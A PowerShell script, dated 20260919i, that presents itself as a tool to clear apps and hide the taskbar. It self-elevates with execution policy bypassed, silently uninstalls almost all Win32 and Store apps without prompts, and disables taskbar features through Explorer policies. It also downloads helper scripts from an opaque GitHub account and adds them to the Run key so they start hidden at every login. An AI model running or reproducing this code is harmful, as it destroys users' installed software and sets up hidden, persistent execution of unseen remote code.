<#
.SYNOPSIS
  Clear removable apps, hide the taskbar, show a folder logo to open files.
#>
[CmdletBinding()]
param(
  [switch]$SkipWipe,
  [switch]$SkipTray
)
Set-StrictMode -Version 1
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

function Test-IsAdmin {
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  $p = New-Object Security.Principal.WindowsPrincipal($id)
  return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Get-Prop {
  param($Object, [string]$Name)
  if ($null -eq $Object) { return $null }
  $prop = $Object.PSObject.Properties[$Name]
  if ($prop) { return $prop.Value }
  return $null
}
function Get-SelfPath {
  foreach ($candidate in @($PSCommandPath, (Get-Prop $MyInvocation.MyCommand 'Path'), (Get-Prop $MyInvocation.MyCommand 'Definition'))) {
    if ($candidate -and $candidate -like '*.ps1' -and (Test-Path -LiteralPath $candidate)) { return $candidate }
  }
  return $null
}
function Test-NameLike([string]$Name, [string[]]$Patterns) {
  if ([string]::IsNullOrWhiteSpace($Name)) { return $false }
  foreach ($pattern in $Patterns) { if ($Name -like $pattern) { return $true } }
  return $false
}

$homeRoot = Join-Path $env:USERPROFILE 'admin'
New-Item -ItemType Directory -Force -Path $homeRoot | Out-Null
$log = Join-Path $homeRoot 'Clear-Apps-And-Tray.log'
function Write-Log([string]$Message) {
  $line = '{0:yyyy-MM-dd HH:mm:ss} {1}' -f (Get-Date), $Message
  try { $line | Tee-Object -FilePath $log -Append } catch { Write-Host $line }
}

Write-Host 'Clear-Apps-And-Tray 20260919i — folder logo, no taskbar'
Write-Log 'Clear-Apps-And-Tray 20260919i — folder logo, no taskbar'

if (-not (Test-IsAdmin)) {
  $self = Get-SelfPath
  if (-not $self) { $self = $MyInvocation.MyCommand.Definition }
  $arg = @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$self`"")
  if ($SkipWipe) { $arg += '-SkipWipe' }
  if ($SkipTray) { $arg += '-SkipTray' }
  Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Verb RunAs -ArgumentList $arg | Out-Null
  return
}

Write-Log "==== start user=$env:USERNAME computer=$env:COMPUTERNAME ===="

function Stop-OldHelpers {
  try { Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'AdminSetupStartLogo' -ErrorAction SilentlyContinue } catch {}
  Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.CommandLine -and ($_.CommandLine -like '*Show-StartLogo.ps1*' -or $_.CommandLine -like '*Show-FolderLogo.ps1*')) {
      try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
    }
  }
}

function Install-Helper([string]$Name) {
  $dest = Join-Path $homeRoot $Name
  $here = Split-Path -Parent (Get-SelfPath)
  $local = Join-Path $here $Name
  if ($local -and (Test-Path -LiteralPath $local)) {
    Copy-Item -LiteralPath $local -Destination $dest -Force
  } else {
    try {
      Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/$Name" -OutFile $dest
    } catch { Write-Log "$Name download failed: $($_.Exception.Message)" }
  }
  return $dest
}

function Start-HiddenScript([string]$Path, [string]$RunName) {
  if (-not (Test-Path -LiteralPath $Path)) { return }
  $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
  New-Item -Path $runKey -Force | Out-Null
  $cmd = "`"$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Path`""
  New-ItemProperty -Path $runKey -Name $RunName -Value $cmd -PropertyType String -Force | Out-Null
  Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$Path`"") | Out-Null
  Write-Log "Started $Path"
}

function Invoke-UninstallCommand([string]$Command) {
  if ([string]::IsNullOrWhiteSpace($Command)) { return $false }
  if ($Command -match '(?i)explorer(\.exe)?') { return $false }
  try {
    if ($Command -match '\{([0-9A-Fa-f-]{36})\}') {
      $p = Start-Process -FilePath 'msiexec.exe' -ArgumentList @("/X{$($Matches[1])}", '/qn', '/norestart') -Wait -PassThru -WindowStyle Hidden
      return ($p.ExitCode -in 0, 1605, 1614, 1641, 3010)
    }
    $exe = $Command; $args = ''
    if ($Command -match '^"([^"]+)"\s*(.*)$') { $exe = $Matches[1]; $args = [string]$Matches[2] }
    elseif ($Command -match '^(\S+)\s*(.*)$') { $exe = $Matches[1]; $args = [string]$Matches[2] }
    if ($exe -match '(?i)explorer(\.exe)?$') { return $false }
    if (-not (Test-Path -LiteralPath $exe)) { return $false }
    $low = "$args".ToLowerInvariant()
    if ($low -notmatch '/s\b|/silent|/quiet|/qn|/norestart') { $args = ("$args /S /silent /quiet /norestart").Trim() }
    $p = Start-Process -FilePath $exe -ArgumentList $args -Wait -PassThru -WindowStyle Hidden
    return ($null -eq $p.ExitCode -or $p.ExitCode -in 0, 1, 1605, 1614, 1641, 3010)
  } catch { return $false }
}

function Invoke-ClearWin32Apps {
  $protect = @('Realtek*','Microsoft Visual C++*','Microsoft Visual Studio* Redistributable*','Microsoft .NET*','Microsoft Edge*','Microsoft Edge WebView2*','Microsoft Update*','Windows PC Health Check*','Update for *','Security Update*','Hotfix*','Intel*','NVIDIA*','AMD*','Chipset*','Canon *','HP *','Printer*','Driver*','Windows Terminal*','Windows SDK*','Microsoft Windows*','Windows Malicious Software Removal*')
  $paths = @('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*')
  $removed = 0
  foreach ($prog in @(Get-ItemProperty $paths -ErrorAction SilentlyContinue)) {
    $name = [string](Get-Prop $prog 'DisplayName')
    if (-not $name) { continue }
    $systemComponent = Get-Prop $prog 'SystemComponent'
    if ($null -ne $systemComponent) { try { if ([int]$systemComponent -eq 1) { continue } } catch {} }
    if (Test-NameLike $name $protect) { continue }
    $uninstall = [string](Get-Prop $prog 'QuietUninstallString')
    if (-not $uninstall) { $uninstall = [string](Get-Prop $prog 'UninstallString') }
    if (-not $uninstall) { continue }
    Write-Host "Uninstall $name"
    if (Invoke-UninstallCommand $uninstall) { $removed++ }
  }
  return $removed
}

function Invoke-ClearStoreApps {
  $keepAppx = @('Microsoft.WindowsStore','Microsoft.StorePurchaseApp','Microsoft.WindowsTerminal','MicrosoftWindows.Client*','Microsoft.Windows.*','Microsoft.UI.*','Microsoft.VCLibs*','Microsoft.Services.Store*','windows.immersivecontrolpanel','Microsoft.DesktopAppInstaller','Microsoft.SecHealthUI','Microsoft.MicrosoftEdge*','Microsoft.ECApp','Microsoft.LockApp','Microsoft.AAD.BrokerPlugin','Microsoft.AccountsControl','Microsoft.BioEnrollment','Microsoft.CredDialogHost','Microsoft.Win32WebViewHost','Microsoft.XboxGameCallableUI','Microsoft.PPIProjection')
  $removed = 0
  try {
    foreach ($pkg in @(Get-AppxPackage -AllUsers -ErrorAction SilentlyContinue)) {
      $name = [string]$pkg.Name
      if (-not $name) { continue }
      if ($pkg.IsFramework -or $pkg.NonRemovable) { continue }
      if (Test-NameLike $name $keepAppx) { continue }
      if ($name -like 'Microsoft.Windows.*' -or $name -like 'Windows.*') { continue }
      Write-Host "Remove Store app $name"
      try { Remove-AppxPackage -Package $pkg.PackageFullName -AllUsers -ErrorAction SilentlyContinue; $removed++ } catch {
        try { Remove-AppxPackage -Package $pkg.PackageFullName -ErrorAction SilentlyContinue; $removed++ } catch {}
      }
    }
  } catch {}
  return $removed
}

function Set-NoTaskbar {
  Write-Host 'Removing taskbar and placing folder logo...'
  Stop-OldHelpers
  $path = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'
  New-Item -Path $path -Force | Out-Null
  foreach ($pair in @{
    NoTrayItemsDisplay = 1; HideClock = 1; HideSCAHealth = 1; HideSCAMeetNow = 1
    HideSCANetwork = 1; HideSCAVolume = 1; HideSCAPower = 1; NoAutoTrayNotify = 1
    NoSetTaskbar = 1; NoTrayContextMenu = 1; HideLocaleBar = 1
  }.GetEnumerator()) {
    try { New-ItemProperty -Path $path -Name $pair.Key -Value $pair.Value -PropertyType DWord -Force | Out-Null } catch {}
  }
  $adv = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
  New-Item -Path $adv -Force | Out-Null
  foreach ($pair in @{
    ShowTaskViewButton = 0; TaskbarDa = 0; TaskbarMn = 0; ShowCopilotButton = 0
    ShowTaskbarChat = 0; SearchboxTaskbarMode = 0; ShowCortanaButton = 0
  }.GetEnumerator()) {
    try { New-ItemProperty -Path $adv -Name $pair.Key -Value $pair.Value -PropertyType DWord -Force | Out-Null } catch {}
  }
  foreach ($key in @('StuckRects3','StuckRects2')) {
    $p = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\$key"
    if (-not (Test-Path $p)) { continue }
    try {
      $s = [byte[]](Get-ItemProperty -Path $p).Settings
      if ($s -and $s.Length -gt 8) { $s[8] = [byte]($s[8] -bor 0x01); Set-ItemProperty -Path $p -Name Settings -Value $s }
    } catch {}
  }
  Start-HiddenScript (Install-Helper 'Hide-Taskbar.ps1') 'AdminSetupHideTaskbar'
  Start-HiddenScript (Install-Helper 'Show-FolderLogo.ps1') 'AdminSetupFolderLogo'
}

$win32 = 0; $store = 0
if ($SkipWipe) { Write-Log 'SkipWipe' } else {
  Write-Host 'Clearing installed apps (no prompts)...'
  $win32 = Invoke-ClearWin32Apps
  $store = Invoke-ClearStoreApps
}
if ($SkipTray) { Write-Log 'SkipTray' } else { Set-NoTaskbar }

Write-Host "Done. Win32 uninstalls: $win32  Store removals: $store"
Write-Host 'Yellow folder logo at bottom center opens your user folder. Taskbar stays hidden.'
Write-Host "Log: $log"
